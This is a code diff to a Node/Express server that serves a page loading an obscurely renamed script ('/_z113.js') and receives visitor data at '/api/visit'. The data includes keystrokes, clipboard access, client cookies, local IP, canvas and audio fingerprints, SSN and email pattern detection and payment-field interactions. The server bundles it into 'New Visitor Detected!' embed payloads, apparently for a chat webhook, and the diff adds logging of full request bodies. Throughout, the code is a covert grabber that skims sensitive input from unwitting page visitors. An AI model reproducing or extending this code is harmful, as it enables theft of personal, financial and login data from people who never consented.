@@ -87,7 +87,7 @@ app.get('/index.html', (req, res) => {
     </head>
     <body>
       <h1>Welcome</h1>
-      <script src="/client.js"></script>
+      <script src="/_z113.js"></script>
     </body>
     </html>
   `);
@@ -152,10 +152,10 @@ function isValidIP(ip) {
 function detectSecurityThreats(req, visitorInfo) {
   const threats = [];
 
-  if (req.body.inlineScripts?.length || req.body.cookieAccess) {
+  if (req.body.part4?.inlineScripts?.length || req.body.part4?.cookieAccess) {
     threats.push({
       type: 'XSS',
-      details: `Detected ${req.body.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.cookieAccess}`
+      details: `Detected ${req.body.part4?.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.part4?.cookieAccess}`
     });
   }
 
@@ -166,10 +166,10 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.thirdPartyRequests?.length) {
+  if (req.body.part4?.thirdPartyRequests?.length) {
     threats.push({
       type: 'Cookie Syncing',
-      details: `Third-party requests to: ${req.body.thirdPartyRequests.join(', ')}`
+      details: `Third-party requests to: ${req.body.part4?.thirdPartyRequests.join(', ')}`
     });
   }
 
@@ -194,10 +194,10 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.postMessageCalls?.length) {
+  if (req.body.part4?.postMessageCalls?.length) {
     threats.push({
       type: 'PostMessage Misuse',
-      details: `Unverified postMessage calls: ${req.body.postMessageCalls.join(', ')}`
+      details: `Unverified postMessage calls: ${req.body.part4?.postMessageCalls.join(', ')}`
     });
   }
 
@@ -264,22 +264,6 @@ function detectSecurityThreats(req, visitorInfo) {
     });
   }
 
-  if (req.body.location && req.body.location !== 'Geolocation not available' && req.body.location !== 'Geolocation not supported') {
-    const { latitude, longitude, accuracy } = req.body.location;
-    if (latitude === 0 && longitude === 0) {
-      threats.push({
-        type: 'Suspicious Location',
-        details: 'Location coordinates are exactly (0, 0), possible spoofing'
-      });
-    }
-    if (accuracy > 1000) {
-      threats.push({
-        type: 'Low Location Accuracy',
-        details: `Location accuracy is low: ${accuracy} meters`
-      });
-    }
-  }
-
   return threats;
 }
 
@@ -304,8 +288,8 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
     const agent = useragent.parse(req.headers['user-agent']);
     const referer = req.headers['referer'] || 'Direct';
 
-    const plugins = req.body.plugins ? Array.isArray(req.body.plugins) ? req.body.plugins : [] : [];
-    const mimeTypes = req.body.mimeTypes ? Array.isArray(req.body.mimeTypes) ? req.body.mimeTypes : [] : [];
+    const plugins = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
+    const mimeTypes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];
 
     const visitorInfo = {
       sessionId: req.sessionId,
@@ -323,37 +307,36 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
       mobile: geoData.mobile,
       proxy: geoData.proxy,
       hosting: geoData.hosting,
-      device: req.body.device || 'Unknown',
-      timestamp: req.body.ts || new Date().toISOString(),
+      device: req.body.part1?.device || 'Unknown',
+      timestamp: req.body.part1?.timestamp || new Date().toISOString(),
       browser: agent.toAgent(),
       os: agent.os.toString(),
       deviceType: agent.device.toString(),
-      referer: referer,
+      referer: req.body.part1?.referer || 'Direct',
       acceptLanguage: req.headers['accept-language'] || 'Unknown',
       accept: req.headers['accept'] || 'Unknown',
       connection: req.headers['connection'] || 'Unknown',
       requestMethod: req.method,
       requestPath: req.originalUrl,
       userAgentRaw: req.headers['user-agent'],
-      screenSize: req.body.screenSize || 'Unknown',
-      colorDepth: req.body.colorDepth || 'Unknown',
-      timezone: req.body.timezone || 'Unknown',
-      language: req.body.language || 'Unknown',
-      hardwareConcurrency: req.body.hardwareConcurrency || 'Unknown',
-      deviceMemory: req.body.deviceMemory || 'Unknown',
-      doNotTrack: req.body.doNotTrack || 'Unknown',
+      screenSize: req.body.part1?.screenSize || 'Unknown',
+      colorDepth: req.body.part3?.colorDepth || 'Unknown',
+      timezone: req.body.part3?.timezone || 'Unknown',
+      language: req.body.part3?.language || 'Unknown',
+      hardwareConcurrency: req.body.part3?.hardwareConcurrency || 'Unknown',
+      deviceMemory: req.body.part3?.deviceMemory || 'Unknown',
+      doNotTrack: req.body.part3?.doNotTrack || 'Unknown',
       plugins: plugins,
       mimeTypes: mimeTypes,
-      inlineScripts: req.body.inlineScripts || [],
-      cookieAccess: req.body.cookieAccess || false,
-      thirdPartyRequests: req.body.thirdPartyRequests || [],
-      postMessageCalls: req.body.postMessageCalls || [],
-      touchSupport: req.body.touchSupport || 'Unknown',
-      batteryStatus: req.body.batteryStatus || 'Unknown',
-      currentUrl: req.body.currentUrl || 'Unknown',
-      scrollPosition: req.body.scrollPosition || 'Unknown',
+      inlineScripts: req.body.part4?.inlineScripts || [],
+      cookieAccess: req.body.part4?.cookieAccess || false,
+      thirdPartyRequests: req.body.part4?.thirdPartyRequests || [],
+      postMessageCalls: req.body.part4?.postMessageCalls || [],
+      touchSupport: req.body.part3?.touchSupport || 'Unknown',
+      batteryStatus: req.body.part3?.batteryStatus || 'Unknown',
+      currentUrl: req.body.part1?.currentUrl || 'Unknown',
+      scrollPosition: req.body.part3?.scrollPosition || 'Unknown',
       cookies: JSON.stringify(req.cookies) || '{}',
-      location: req.body.location || 'Unknown',
       part3: {
         keystrokes: req.body.part3?.keystrokes || 'None',
         mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
@@ -368,7 +351,6 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
         ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
         emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
         paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None',
-        referrer: req.body.part3?.referrer || 'Direct',
         utmParameters: req.body.part3?.utmParameters || '{}',
         clickedElements: req.body.part3?.clickedElements || 'None',
         sessionDuration: req.body.part3?.sessionDuration || 'Unknown',
@@ -394,101 +376,98 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
     const fields = [
       { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
-      { name: 'Device', value: visitorInfo.device, inline: true },
       { name: 'IP', value: visitorInfo.ip, inline: true },
       { name: 'All IPs', value: visitorInfo.allIPs.join(', ') || 'N/A', inline: true },
+      { name: 'Device', value: visitorInfo.device, inline: true },
+      { name: 'Referer', value: visitorInfo.referer, inline: true },
+      { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
+      { name: 'Timestamp', value: visitorInfo.timestamp, inline: true },
       { name: 'Country', value: visitorInfo.country, inline: true },
-      { name: 'Region', value: visitorInfo.region, inline: true },
       { name: 'City', value: visitorInfo.city, inline: true },
-      { name: 'ZIP', value: visitorInfo.zip || 'N/A', inline: true },
       { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
-      { name: 'IP-based Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
-      { name: 'Device Location', value: visitorInfo.location !== 'Unknown' ? `(${visitorInfo.location.latitude}, ${visitorInfo.location.longitude}, Accuracy: ${visitorInfo.location.accuracy}m)` : visitorInfo.location, inline: true },
       { name: 'ISP', value: visitorInfo.isp, inline: true },
-      { name: 'Organization', value: visitorInfo.organization || 'N/A', inline: true },
-      { name: 'AS', value: visitorInfo.as || 'N/A', inline: true },
       { name: 'Mobile', value: visitorInfo.mobile ? 'Yes' : 'No', inline: true },
       { name: 'Proxy', value: visitorInfo.proxy ? 'Yes' : 'No', inline: true },
       { name: 'Hosting', value: visitorInfo.hosting ? 'Yes' : 'No', inline: true },
       { name: 'Browser', value: visitorInfo.browser, inline: true },
       { name: 'OS', value: visitorInfo.os, inline: true },
       { name: 'Device Type', value: visitorInfo.deviceType, inline: true },
-      { name: 'Referer', value: visitorInfo.referer, inline: true },
-      { name: 'Language', value: visitorInfo.acceptLanguage, inline: true },
-      { name: 'Accept', value: visitorInfo.accept, inline: true },
-      { name: 'Connection', value: visitorInfo.connection, inline: true },
       { name: 'Screen Size', value: visitorInfo.screenSize, inline: true },
-      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
       { name: 'Timezone', value: visitorInfo.timezone, inline: true },
+      { name: 'Language', value: visitorInfo.language, inline: true },
+      { name: 'Accept Language', value: visitorInfo.acceptLanguage, inline: true },
       { name: 'Touch Support', value: visitorInfo.touchSupport, inline: true },
       { name: 'Battery Status', value: visitorInfo.batteryStatus, inline: true },
-      { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
+      { name: 'Color Depth', value: visitorInfo.colorDepth, inline: true },
+      { name: 'Hardware Concurrency', value: visitorInfo.hardwareConcurrency, inline: true },
+      { name: 'Device Memory', value: visitorInfo.deviceMemory, inline: true },
+      { name: 'Do Not Track', value: visitorInfo.doNotTrack, inline: true },
+      { name: 'Connection', value: visitorInfo.connection, inline: true },
       { name: 'Scroll Position', value: visitorInfo.scrollPosition, inline: true },
       { name: 'Cookies (Server)', value: visitorInfo.cookies, inline: true },
-      { name: 'Part 3: Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
-      { name: 'Part 3: Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
-      { name: 'Part 3: WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
-      { name: 'Part 3: Connection Type', value: visitorInfo.part3.connectionType, inline: true },
-      { name: 'Part 3: Clipboard Access', value: visitorInfo.part3.clipboardAccess, inline: true },
-      { name: 'Part 3: Device Orientation', value: visitorInfo.part3.deviceOrientationSupport, inline: true },
-      { name: 'Part 3: Session Storage', value: visitorInfo.part3.sessionStorageUsage, inline: true },
-      { name: 'Part 3: Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
-      { name: 'Part 3: Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
-      { name: 'Part 3: Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
-      { name: 'Part 3: SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
-      { name: 'Part 3: Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
-      { name: 'Part 3: Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
-      { name: 'Part 3: Referrer', value: visitorInfo.part3.referrer, inline: true },
-      { name: 'Part 3: UTM Parameters', value: visitorInfo.part3.utmParameters, inline: true },
-      { name: 'Part 3: Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
-      { name: 'Part 3: Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
-      { name: 'Part 3: Event Log', value: visitorInfo.part3.eventLog, inline: true },
-      { name: 'Part 4: Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
-      { name: 'Part 4: Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
-      { name: 'Part 4: Local IP', value: visitorInfo.part4.localIP, inline: true },
-      { name: 'Part 4: Canvas Fingerprint', value: visitorInfo.part4.canvasFingerprint, inline: true },
-      { name: 'Part 4: Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
+      { name: 'Keystrokes', value: visitorInfo.part3.keystrokes, inline: true },
+      { name: 'Mouse Frequency', value: visitorInfo.part3.mouseMovementFrequency, inline: true },
+      { name: 'WebGL Support', value: visitorInfo.part3.webglSupport, inline: true },
+      { name: 'Connection Type', value: visitorInfo.part3.connectionType, inline: true },
+      { name: 'Clipboard Access', value: visitorInfo.part3.clipboardAccess, inline: true },
+      { name: 'Device Orientation', value: visitorInfo.part3.deviceOrientationSupport, inline: true },
+      { name: 'Session Storage', value: visitorInfo.part3.sessionStorageUsage, inline: true },
+      { name: 'Browser Features', value: visitorInfo.part3.browserFeatures, inline: true },
+      { name: 'Page Load Time', value: visitorInfo.part3.pageLoadTime, inline: true },
+      { name: 'Interaction Count', value: visitorInfo.part3.userInteractionCount.toString(), inline: true },
+      { name: 'SSN Pattern', value: visitorInfo.part3.ssnPatternDetected, inline: true },
+      { name: 'Email Pattern', value: visitorInfo.part3.emailPatternDetected, inline: true },
+      { name: 'Payment Interaction', value: visitorInfo.part3.paymentFieldInteraction, inline: true },
+      { name: 'UTM Parameters', value: visitorInfo.part3.utmParameters, inline: true },
+      { name: 'Clicked Elements', value: visitorInfo.part3.clickedElements, inline: true },
+      { name: 'Session Duration', value: visitorInfo.part3.sessionDuration, inline: true },
+      { name: 'Event Log', value: visitorInfo.part3.eventLog, inline: true },
+      { name: 'Client Cookies', value: visitorInfo.part4.clientCookies, inline: true },
+      { name: 'Local Storage Usage', value: visitorInfo.part4.localStorageUsage, inline: true },
+      { name: 'Local IP', value: visitorInfo.part4.localIP, inline: true },
+      { name: 'Canvas Fingerprint', value: visitorInfo.part4.canvasFingerprint, inline: true },
+      { name: 'Audio Fingerprint', value: visitorInfo.part4.audioFingerprint, inline: true },
       { name: 'Threats', value: threats.length ? threats.map(t => `${t.type}: ${t.details}`).join('\n') : 'None', inline: false }
     ];
 
-    const firstBatch = fields.slice(0, 15);
-    const secondBatch = fields.slice(15, 30);
-    const thirdBatch = fields.slice(30, 45);
-    const fourthBatch = fields.slice(45);
+    const part1 = fields.slice(0, 15); // Critical data: IP, all IPs, device, referrer, etc.
+    const part2 = fields.slice(15, 30); // Browser and device details
+    const part3 = fields.slice(30, 45); // Interaction and behavioral data
+    const part4 = fields.slice(45); // Fingerprints and threats
 
     const payload1 = {
       embeds: [{
-        title: 'New Visitor Detected! (Part 1)',
+        title: 'New Visitor Detected! (Part 1 - Critical Info)',
         color: threats.length ? 0xff0000 : 0x00ff00,
         timestamp: visitorInfo.timestamp,
-        fields: firstBatch
+        fields: part1
       }]
     };
 
     const payload2 = {
       embeds: [{
-        title: 'New Visitor Detected! (Part 2)',
+        title: 'New Visitor Detected! (Part 2 - Device Details)',
         color: threats.length ? 0xff0000 : 0x00ff00,
         timestamp: visitorInfo.timestamp,
-        fields: secondBatch
+        fields: part2
       }]
     };
 
     const payload3 = {
       embeds: [{
-        title: 'New Visitor Detected! (Part 3)',
+        title: 'New Visitor Detected! (Part 3 - Interactions)',
         color: threats.length ? 0xff0000 : 0x00ff00,
         timestamp: visitorInfo.timestamp,
-        fields: thirdBatch
+        fields: part3
       }]
     };
 
     const payload4 = {
       embeds: [{
-        title: 'New Visitor Detected! (Part 4)',
+        title: 'New Visitor Detected! (Part 4 - Fingerprints & Threats)',
         color: threats.length ? 0xff0000 : 0x00ff00,
         timestamp: visitorInfo.timestamp,
-        fields: fourthBatch
+        fields: part4
       }]
     };
 
@@ -606,7 +585,7 @@ app.post('/api/visit', csrfProtection, async (req, res) => {
 
     res.status(200).send('Visitor info recorded');
   } catch (error) {
-    logger.error('Error in /api/visit', { error: error.message, stack: error.stack });
+    logger.error('Error in /api/visit', { error: error.message, stack: error.stack, body: req.body });
     res.status(500).send('Server error');
   }
 });
@@ -638,4 +617,3 @@ app.use((err, req, res, next) => {
 
 const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => logger.info(`Server running on port ${PORT}`));
-
